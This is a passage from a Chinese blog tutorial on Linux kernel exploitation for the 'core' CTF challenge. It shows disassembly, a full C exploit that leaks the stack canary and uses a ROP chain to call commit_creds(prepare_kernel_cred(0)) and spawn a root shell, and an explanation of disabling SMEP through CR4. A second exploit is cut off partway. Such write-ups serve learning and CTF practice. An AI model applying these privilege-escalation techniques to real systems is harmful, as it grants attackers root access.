class="line">.text:FFFFFFFF81A00954                 pop     rdi</span><br><span class="line">.text:FFFFFFFF81A00955                 swapgs</span><br><span class="line">.text:FFFFFFFF81A00958                 jmp     native_iret</span><br><span class="line">.text:FFFFFFFF81A00958 swapgs_restore_regs_and_return_to_usermode endp</span><br><span class="line">[......]</span><br><span class="line">;native_iret</span><br><span class="line">.text:FFFFFFFF81A00980                 test    [rsp+arg_18], 4</span><br><span class="line">.text:FFFFFFFF81A00985                 jnz     short native_irq_return_ldt</span><br><span class="line">.text:FFFFFFFF81A00985 native_iret     endp</span><br><span class="line">[......]</span><br><span class="line">;native_irq_return_ldt</span><br><span class="line">.text:FFFFFFFF81A00989                 push    rdi</span><br><span class="line">.text:FFFFFFFF81A0098A                 swapgs</span><br><span class="line">.text:FFFFFFFF81A0098D                 jmp     short loc_FFFFFFFF81A009A1</span><br><span class="line">[......]</span><br><span class="line">;loc_FFFFFFFF81A009A1</span><br><span class="line">.text:FFFFFFFF81A009A1                 mov     rdi, gs:qword_F000</span><br><span class="line">.text:FFFFFFFF81A009AA                 mov     [rdi], rax</span><br><span class="line">.text:FFFFFFFF81A009AD                 mov     rax, [rsp+8]</span><br><span class="line">.text:FFFFFFFF81A009B2                 mov     [rdi+8], rax</span><br><span class="line">.text:FFFFFFFF81A009B6                 mov     rax, [rsp+8+arg_0]</span><br><span class="line">.text:FFFFFFFF81A009BB                 mov     [rdi+10h], rax</span><br><span class="line">.text:FFFFFFFF81A009BF                 mov     rax, [rsp+8+arg_8]</span><br><span class="line">.text:FFFFFFFF81A009C4                 mov     [rdi+18h], rax</span><br><span class="line">.text:FFFFFFFF81A009C8                 mov     rax, [rsp+8+arg_18]</span><br><span class="line">.text:FFFFFFFF81A009CD                 mov     [rdi+28h], rax</span><br><span class="line">.text:FFFFFFFF81A009D1                 mov     rax, [rsp+8+arg_10]</span><br><span class="line">.text:FFFFFFFF81A009D6                 mov     [rdi+20h], rax</span><br><span class="line">.text:FFFFFFFF81A009DA                 and     eax, 0FFFF0000h</span><br><span class="line">.text:FFFFFFFF81A009DF                 or      rax, gs:qword_F008</span><br><span class="line">.text:FFFFFFFF81A009E8                 push    rax</span><br><span class="line">.text:FFFFFFFF81A009E9                 jmp     short loc_FFFFFFFF81A00A2E</span><br><span class="line">[......]</span><br><span class="line">;loc_FFFFFFFF81A00A2E</span><br><span class="line">.text:FFFFFFFF81A00A2E                 pop     rax</span><br><span class="line">.text:FFFFFFFF81A00A2F                 swapgs</span><br><span class="line">.text:FFFFFFFF81A00A32                 pop     rdi</span><br><span class="line">.text:FFFFFFFF81A00A33                 mov     rsp, rax</span><br><span class="line">.text:FFFFFFFF81A00A36                 pop     rax</span><br><span class="line">.text:FFFFFFFF81A00A37                 jmp     native_irq_return_iret</span><br><span class="line">[......]</span><br><span class="line">;native_irq_return_iret</span><br><span class="line">.text:FFFFFFFF81A00987                 iretq</span><br><span class="line">.text:FFFFFFFF81A00987 native_irq_return_iret endp</span><br></pre></td></tr></table></figure></div>

<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xFFFFFFFF8109CCE0</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xFFFFFFFF8109C8E0</span>;</span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xFFFFFFFF8223D1A0</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff81000b2f</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdx_ret = <span class="number">0xffffffff810a0f49</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rcx_ret = <span class="number">0xffffffff81021e53</span>;</span><br><span class="line"><span class="type">size_t</span> mov_rdi_rax_call_rdx = <span class="number">0xffffffff8101aa6a</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_popfq_ret = <span class="number">0xffffffff81a012da</span>;</span><br><span class="line"><span class="type">size_t</span> iretq = <span class="number">0xffffffff81050ac2</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xFFFFFFFF81A008DA</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> core_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">char</span> *buf)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">size_t</span> off)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889C</span>, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889A</span>, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_write</span><span class="params">(<span class="type">char</span> *buf, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    write(core_fd, buf, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rebase</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open kallsyms.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">0x50</span>], type[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fscanf</span>(kallsyms_fd, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, name)) &#123;</span><br><span class="line">        <span class="type">size_t</span> offset = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;commit_creds&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) commit_creds;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;prepare_kernel_cred&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) prepare_kernel_cred;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (offset != <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] offset: %p\n&quot;</span>, offset);</span><br><span class="line">            commit_creds += offset;</span><br><span class="line">            prepare_kernel_cred += offset;</span><br><span class="line">            init_cred += offset;</span><br><span class="line">            pop_rdi_ret += offset;</span><br><span class="line">            pop_rdx_ret += offset;</span><br><span class="line">            pop_rcx_ret += offset;</span><br><span class="line">            mov_rdi_rax_call_rdx += offset;</span><br><span class="line">            swapgs_popfq_ret += offset;</span><br><span class="line">            iretq += offset;</span><br><span class="line">            swapgs_restore_regs_and_return_to_usermode += offset;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] commit_creds: %p\n&quot;</span>, (<span class="type">size_t</span>) commit_creds);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] prepare_kernel_cred: %p\n&quot;</span>, (<span class="type">size_t</span>) prepare_kernel_cred);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">get_canary</span><span class="params">()</span> &#123;</span><br><span class="line">    set_off(<span class="number">64</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line">    core_read(buf);</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">size_t</span> *) buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    save_status();</span><br><span class="line">    rebase();</span><br><span class="line"></span><br><span class="line">    core_fd = open(<span class="string">&quot;/proc/core&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (core_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open core.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> canary = get_canary();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    *(<span class="type">size_t</span> *) &amp;buf[<span class="number">64</span>] = canary;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *rop = (<span class="type">size_t</span> *) &amp;buf[<span class="number">80</span>], it = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//    rop[it++] = pop_rdi_ret;</span></span><br><span class="line"><span class="comment">//    rop[it++] = init_cred;</span></span><br><span class="line"><span class="comment">//    rop[it++] = commit_creds;</span></span><br><span class="line"></span><br><span class="line">    rop[it++] = pop_rdi_ret;</span><br><span class="line">    rop[it++] = <span class="number">0</span>;</span><br><span class="line">    rop[it++] = prepare_kernel_cred;</span><br><span class="line">    rop[it++] = pop_rdx_ret;</span><br><span class="line">    rop[it++] = pop_rcx_ret;</span><br><span class="line">    rop[it++] = mov_rdi_rax_call_rdx;</span><br><span class="line">    rop[it++] = commit_creds;</span><br><span class="line"></span><br><span class="line">    rop[it++] = swapgs_restore_regs_and_return_to_usermode + <span class="number">0x16</span>;</span><br><span class="line">    rop[it++] = <span class="number">0</span>;</span><br><span class="line">    rop[it++] = <span class="number">0</span>;</span><br><span class="line">    rop[it++] = (<span class="type">size_t</span>) get_shell;</span><br><span class="line">    rop[it++] = user_cs;</span><br><span class="line">    rop[it++] = user_rflags;</span><br><span class="line">    rop[it++] = user_sp;</span><br><span class="line">    rop[it++] = user_ss;</span><br><span class="line"></span><br><span class="line">    core_write(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    core_copy_func(<span class="number">0xffffffffffff0000</span> | <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="kernel-rop-ret2user"><a href="#kernel-rop-ret2user" class="headerlink" title="kernel rop + ret2user"></a>kernel rop + ret2user</h2><h3 id="利用思路-3"><a href="#利用思路-3" class="headerlink" title="利用思路"></a>利用思路</h3><p>这种方法实际上是将前两种方法结合起来，同样可以绕过 smap 和 smep 保护。大体思路是先利用 rop 设置 cr4 为 0x6f0  （这个值可以通过用 cr4 原始值 &amp; 0xFFFFF 得到）关闭 smep ， 然后 iret 到用户空间去执行提权代码。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/smep.jpg"
                      alt="smep"
                ></p>
<p>例如，当 </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$CR4 = 0x1407f0 = 000 1 0100 0000 0111 1111 0000</span><br></pre></td></tr></table></figure></div>

<p>时，smep 保护开启。而 CR4 寄存器是可以通过 mov 指令修改的，因此只需要 </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov cr4, 0x1407e0</span><br><span class="line"># 0x1407e0 = 101 0 0000 0011 1111 00000</span><br></pre></td></tr></table></figure></div>

<p>即可关闭 smep 保护。</p>
<p>搜索一下从 <code>vmlinux</code> 中提取出的 gadget，很容易就能达到这个目的。</p>
<ul>
<li>如何查看 CR4 寄存器的值？<ul>
<li>gdb 无法查看 cr4 寄存器的值，可以通过 kernel crash 时的信息查看。为了关闭 smep 保护，常用一个固定值 <code>0x6f0</code>，即 <code>mov cr4, 0x6f0</code>。</li>
</ul>
</li>
</ul>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><p>注意这里 smap 保护不能直接关闭，因此不能像前面 ret2usr 那样直接在 exp 中写入 trap frame 然后栈迁移到 trap frame 的地址，而是在 rop 中构造 trap frame 结构。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *(*prepare_kernel_cred)(<span class="type">void</span> *) KERNCALL = (<span class="type">void</span> *) <span class="number">0xFFFFFFFF8109CCE0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *(*commit_creds)(<span class="type">void</span> *) KERNCALL = (<span class="type">void</span> *) <span class="number">0xFFFFFFFF8109C8E0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *init_cred = (<span class="type">void</span> *) <span class="number">0xFFFFFFFF8223D1A0</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff81000b2f</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdx_ret = <span class="number">0xffffffff810a0f49</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rcx_ret = <span class="number">0xffffffff81021e53</span>;</span><br><span class="line"><span class="type">size_t</span> mov_cr4_rdi_ret = <span class="number">0xffffffff81075014</span>;</span><br><span class="line"><span class="type">size_t</span> mov_rdi_rax_call_rdx = <span class="number">0xffffffff8101aa6a</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_popfq_ret = <span class="number">0xffffffff81a012da</span>;</span><br><span class="line"><span class="type">size_t</span> iretq = <span class="number">0xffffffff81050ac2</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span> &#123; system(<span class="string">&quot;/bin/sh&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span> &#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> core_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">char</span> *buf)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">size_t</span> off)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889C</span>, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889A</span>, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_write</span><span class="params">(<span class="type">char</span> *buf, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    write(core_fd, buf, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rebase</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open kallsyms.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">0x50</span>], type[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fscanf</span>(kallsyms_fd, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, name)) &#123;</span><br><span class="line">        <span class="type">size_t</span> offset = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;commit_creds&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) commit_creds;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;prepare_kernel_cred&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) prepare_kernel_cred;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (offset != <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] offset: %p\n&quot;</span>, offset);</span><br><span class="line">            commit_creds = (<span class="type">void</span> *) ((<span class="type">size_t</span>) commit_creds + offset);</span><br><span class="line">            prepare_kernel_cred = (<span class="type">void</span> *) ((<span class="type">size_t</span>) prepare_kernel_cred + offset);</span><br><span class="line">            init_cred = (<span class="type">void</span> *) ((<span class="type">size_t</span>) init_cred + offset);</span><br><span class="line">            pop_rdi_ret += offset;</span><br><span class="line">            pop_rdx_ret += offset;</span><br><span class="line">            pop_rcx_ret += offset;</span><br><span class="line">            mov_rdi_rax_call_rdx += offset;</span><br><span class="line">            swapgs_popfq_ret += offset;</span><br><span class="line">            iretq += offset;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] commit_creds: %p\n&quot;</span>, (<span class="type">size_t</span>) commit_creds);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] prepare_kernel_cred: %p\n&quot;</span>, (<span class="type">size_t</span>) prepare_kernel_cred);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">get_canary</span><span class="params">()</span> &#123;</span><br><span class="line">    set_off(<span class="number">64</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line">    core_read(buf);</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">size_t</span> *) buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    save_status();</span><br><span class="line">    rebase();</span><br><span class="line"></span><br><span class="line">    core_fd = open(<span class="string">&quot;/proc/core&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (core_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open core.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> canary = get_canary();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span 